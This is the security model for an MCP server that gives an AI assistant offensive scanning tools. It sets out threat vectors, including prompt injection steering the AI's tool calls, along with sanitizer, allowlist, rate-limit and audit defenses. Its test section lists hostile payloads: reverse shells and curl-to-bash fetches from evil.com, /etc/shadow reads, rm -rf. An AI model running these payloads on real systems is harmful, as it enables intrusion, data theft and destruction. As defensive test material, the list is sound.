# Tengu Security Model

## Overview

Tengu sits in a uniquely sensitive position: it provides an AI assistant with
programmatic access to offensive security tools. A vulnerability in Tengu itself
could allow an attacker to scan unauthorized targets, exfiltrate data, or execute
arbitrary commands on the host running the server.

This document describes the threat model, the five defense layers, and how they
are tested.

---

## Threat Model

### Attacker Assumptions

For threat modeling purposes, Tengu assumes that an attacker can:

1. Craft arbitrary MCP tool call parameters (injected through a compromised prompt
   or a malicious AI response)
2. Observe tool output returned to the MCP client
3. Potentially influence the AI's tool selection via prompt injection in external content
   (e.g., a web page that contains hidden instructions)

The attacker cannot (in the assumed threat model):
- Access the file system directly
- Modify the `tengu.toml` configuration
- Access the audit log directly
- Send raw TCP connections to the MCP server (the server communicates over stdio)

### Attack Vector 1 — Command Injection

**Description**: An attacker crafts a target parameter containing shell metacharacters
that, when passed to a subprocess, cause the shell to execute attacker-controlled commands.

**Example payload**: `192.168.1.1; curl http://evil.com/shell.sh | bash`

**Mitigations**:
- Primary: `asyncio.create_subprocess_exec` is used exclusively. Arguments are passed
  directly to `execve()`. No shell is invoked. Shell metacharacters in arguments have
  no special meaning.
- Secondary (defense in depth): The sanitizer explicitly rejects input containing
  shell metacharacters (`[;&|` + `` ` `` + `$<>(){}[]!\\'"\\r\\n]`) before the
  argument is ever placed into a list.

### Attack Vector 2 — Path Traversal

**Description**: An attacker provides a wordlist path or output path containing `..`
sequences to access files outside expected directories.

**Example payload**: `../../../../etc/shadow`

**Mitigations**:
- `sanitize_wordlist_path()` resolves the path with `Path.resolve()` (canonicalizes
  all `..` sequences) and then checks the result against an allowlist of permitted
  prefixes: `/usr/share`, `/opt`, `$HOME`, `/tmp`.
- Output paths for report generation are validated similarly.

### Attack Vector 3 — Server-Side Request Forgery (SSRF)

**Description**: An attacker tricks Tengu into scanning an internal network host,
cloud metadata endpoint, or loopback address that is not in the engagement scope.

**Example**: Passing `169.254.169.254` (AWS metadata) or `127.0.0.1` as a scan target.

**Mitigations**:
- The allowlist check (`TargetAllowlist.check()`) runs before every scan.
- The default blocklist permanently blocks: `localhost`, `127.0.0.1`, `::1`, `0.0.0.0`,
  `169.254.169.254`, `metadata.google.internal`, `*.gov`, `*.mil`, `*.edu`.
- The user-configurable `allowed_hosts` in `tengu.toml` restricts scanning to an
  explicit set of approved targets. If the allowlist is empty (initial setup), a warning
  is logged but scanning is permitted — operators should configure `allowed_hosts` before
  production use.

### Attack Vector 4 — Rate Abuse / Denial of Service

**Description**: An attacker (or a runaway AI loop) makes hundreds of scan requests
in rapid succession, causing a denial of service on the target, consuming excessive
resources on the host, or generating unbillable traffic.

**Mitigations**:
- Sliding window rate limiter: maximum 10 scans per 60-second window per tool.
- Concurrent scan limit: maximum 3 simultaneous scans per tool.
- Per-scan timeouts: configurable, default 600 seconds. Timed-out processes are killed.
- Rate limit violations are logged to the audit log.

### Attack Vector 5 — Audit Tampering

**Description**: An attacker attempts to obscure their activity by preventing audit
log entries from being written or by injecting malicious data into the log.

**Mitigations**:
- The audit log is an append-only JSONL file. There is no API to delete or modify entries.
- Writes are serialized with `asyncio.Lock` to prevent interleaving that could corrupt records.
- Sensitive parameter values are redacted before logging, preventing log-based secret exposure.
- Log write failures are reported via `logger.error` but do not abort the scan — preventing
  an attacker from using log failures as a denial-of-service against scan operations.
- Future: tamper-evident logging via append-only storage (e.g., write-once S3 bucket or
  a file with `chattr +a` on Linux).

---

## Five Defense Layers

### Layer 1 — Input Sanitizer (`security/sanitizer.py`)

The sanitizer validates every parameter type before it is used anywhere.

| Function | Validates |
|----------|-----------|
| `sanitize_target(value)` | IP, hostname (RFC 1123), CIDR, or URL |
| `sanitize_url(value)` | http/https URL only, no shell metacharacters |
| `sanitize_domain(value)` | hostname or wildcard hostname |
| `sanitize_cidr(value)` | valid CIDR notation via `ipaddress.ip_network` |
| `sanitize_port_spec(value)` | port number, range, or comma list (1-65535) |
| `sanitize_wordlist_path(value)` | absolute path within allowed directories |
| `sanitize_hash(value)` | hex and structured hash chars (`[a-zA-Z0-9$*:./+\-_=@#!%^]+`), max 2048 chars |
| `sanitize_cve_id(value)` | `CVE-YYYY-NNNNN` format |
| `sanitize_free_text(value, field, max_length)` | strips metacharacters, enforces length |
| `sanitize_scan_type(value, allowed, field)` | enum validation against allowlist |
| `sanitize_severity(value)` | validates against {info, low, medium, high, critical} |

All functions raise `InvalidInputError` — they never silently discard or modify input
in a way that could hide an attack.

The shell metacharacter regex is:
```python
_SHELL_METACHARACTERS = re.compile(r'[;&|`$<>()\{\}\[\]!\\\'\"\r\n]')
```

This covers standard POSIX shell metacharacters, backtick substitution, dollar sign
substitution, I/O redirection, subshell grouping, glob characters, and CRLF injection.

### Layer 2 — Target Allowlist (`security/allowlist.py`)

The `TargetAllowlist` class enforces scope restrictions.

```
Evaluation order:
  1. Extract host from target (strip URL scheme, port, path)
  2. Check against blocked_hosts (user + built-in defaults) — ALWAYS wins
  3. Check against allowed_hosts (if non-empty) — target must match at least one pattern
  4. If allowed_hosts is empty, warn and allow (initial-setup mode)
```

Pattern matching supports:
- Exact hostname: `"example.com"`
- Wildcard subdomain: `"*.example.com"` (via `fnmatch`)
- Single IP: `"10.0.0.1"`
- CIDR range: `"192.168.0.0/24"` (via `ipaddress.ip_network`)

Built-in blocked hosts (always active, regardless of user config):
```
localhost, 127.0.0.1, ::1, 0.0.0.0
169.254.169.254        (AWS EC2 metadata)
metadata.google.internal  (GCP metadata)
*.gov, *.mil, *.edu
```

### Layer 3 — Rate Limiter (`security/rate_limiter.py`)

`SlidingWindowRateLimiter` tracks tool invocations using two counters per tool:

1. **Sliding window**: a deque of timestamps within the last 60 seconds. If the count
   reaches `max_scans_per_minute` (default: 10), the next request raises `RateLimitError`
   with a retry-after estimate.
2. **Concurrent slots**: an active count per tool. If it reaches `max_concurrent_scans`
   (default: 3), the next request raises `RateLimitError`.

The `rate_limited(tool_name)` async context manager handles acquire/release:

```python
async with rate_limited("nmap"):
    stdout, stderr, rc = await run_command(args)
```

The context manager releases the slot even if the command raises an exception.

### Layer 4 — Audit Logger (`security/audit.py`)

Every tool call generates at least two audit records:

```jsonl
{"timestamp": "2026-02-28T12:00:00Z", "event": "tool_call", "tool": "nmap", "target": "10.0.0.1", "params": {"ports": "1-1024", "scan_type": "connect"}, "result": "started"}
{"timestamp": "2026-02-28T12:00:45Z", "event": "tool_call", "tool": "nmap", "target": "10.0.0.1", "params": {"ports": "1-1024", "scan_type": "connect"}, "result": "completed", "duration_seconds": 44.821}
```

Blocked targets generate:
```jsonl
{"timestamp": "2026-02-28T12:00:00Z", "event": "target_blocked", "tool": "nmap", "target": "127.0.0.1", "reason": "matches blocked pattern '127.0.0.1'"}
```

Rate limit violations generate:
```jsonl
{"timestamp": "2026-02-28T12:00:00Z", "event": "rate_limit", "tool": "nmap", "details": "Rate limit for 'nmap': 10/10 calls in the last minute. Retry in ~23s."}
```

Sensitive parameter values are replaced with `[REDACTED]` for:
`password`, `passwd`, `secret`, `token`, `key`, `api_key`, `passlist`, `credentials`

The audit log can be queried with `jq`:
```bash
# All blocked attempts today
jq 'select(.event == "target_blocked")' logs/tengu-audit.log

# All scans against a specific target
jq 'select(.target == "10.0.0.1")' logs/tengu-audit.log

# Duration statistics for nmap
jq 'select(.tool == "nmap" and .result == "completed") | .duration_seconds' logs/tengu-audit.log
```

### Layer 5 — Executor (`executor/process.py`)

`run_command(args, timeout, env, cwd)` is the only permitted way to run external
processes in Tengu.

Key properties:
- **No shell**: `asyncio.create_subprocess_exec(*args)` — the first element is the
  executable, remaining elements are arguments. No shell interpolation occurs.
- **Absolute path resolution**: `shutil.which(executable)` resolves the executable to
  its absolute path before execution, preventing PATH manipulation attacks.
- **Timeout enforcement**: `asyncio.wait_for(proc.communicate(), timeout=timeout)`.
  On timeout, `proc.kill()` is called and `ScanTimeoutError` is raised.
- **Clean output handling**: stdout and stderr are decoded as UTF-8 with error replacement
  (malformed bytes in tool output never cause crashes).

---

## Testing Strategy

### Unit Tests (`tests/unit/`)

| File | Coverage |
|------|---------|
| `test_sanitizer.py` | All sanitizer functions: valid inputs, edge cases, length limits |
| `test_allowlist.py` | TargetAllowlist: CIDR matching, wildcard matching, blocklist priority |
| `test_rate_limiter.py` | Window expiry, concurrent limits, acquire/release cycle |
| `test_analysis.py` | correlate_findings attack chain detection, score_risk calculation |
| `test_config.py` | TenguConfig parsing, env var overrides, default values |

### Security Tests (`tests/security/`)

| File | Coverage |
|------|---------|
| `test_command_injection.py` | 74 tests covering all sanitizer functions against `SHELL_INJECTION_PAYLOADS` and `PATH_TRAVERSAL_PAYLOADS` |

The injection payload set covers:
```python
SHELL_INJECTION_PAYLOADS = [
    "; ls -la",
    "& id",
    "| cat /etc/passwd",
    "`whoami`",
    "$(cat /etc/shadow)",
    "; rm -rf /tmp/*",
    "&& curl http://evil.com/shell.sh | bash",
    "|| id",
    "\n/bin/sh",
    "; nc -e /bin/sh evil.com 4444",
    "$(curl http://evil.com/malware -o /tmp/m && chmod +x /tmp/m && /tmp/m)",
    "> /dev/null; id",
    "1 --flag $(id)",
    "test' OR '1'='1",
    'test" OR "1"="1',
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
```

Each payload is tested against every sanitizer function that accepts string inputs,
ensuring that no variant of a known injection technique can pass through.

### Integration Tests (`tests/integration/`)

Integration tests require real tools to be installed on the host. They test:
- Actual nmap scan against localhost (non-destructive)
- Actual DNS lookups against public resolvers
- Tool path resolution
- Audit log creation and content

Run with: `make test-integration`

### Running the Full Security Test Suite

```bash
# Fast path (unit + security — no external tools needed)
make test

# Security tests only
make test-security

# With coverage report
make coverage
```

---

## Security Checklist for Contributors

Before submitting any PR that adds or modifies tool code, verify:

- [ ] All string inputs pass through an appropriate `sanitize_*` function
- [ ] Target/host parameters pass through `allowlist.check(target)` before execution
- [ ] All external process calls use `run_command()` or `stream_command()` — never `subprocess.run`, `os.system`, `shell=True`
- [ ] Audit log entries are written for "started" and "completed"/"failed"
- [ ] Active scan tools are wrapped in `async with rate_limited(tool_name)`
- [ ] Sensitive parameter names are added to `_SENSITIVE_KEYS` in `audit.py` if new ones are introduced
- [ ] New tool has corresponding security tests in `tests/security/test_command_injection.py`
- [ ] `make test` passes with 0 failures
- [ ] `make lint` passes with 0 errors
- [ ] `make typecheck` passes with 0 errors
